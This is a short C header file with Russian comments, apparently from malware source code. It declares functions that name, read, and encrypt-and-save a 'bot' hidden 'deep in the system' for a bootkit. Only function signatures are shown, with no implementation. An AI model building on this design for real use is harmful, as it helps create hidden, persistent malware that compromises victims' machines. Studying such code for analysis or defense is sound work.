#include "crypt.h"

//возвращает имя файла зашифрованного бота
char* NameFileForBootkit( char* buf, int c_buf );
//возвращает тело сохраненного и зашифрованного бота 
BYTE* ReadBotForBootkit( DWORD& size );
//шифрует и сохраняет бот в недрах системы
bool WriteBotForBootkit( BYTE* data, DWORD c_data );
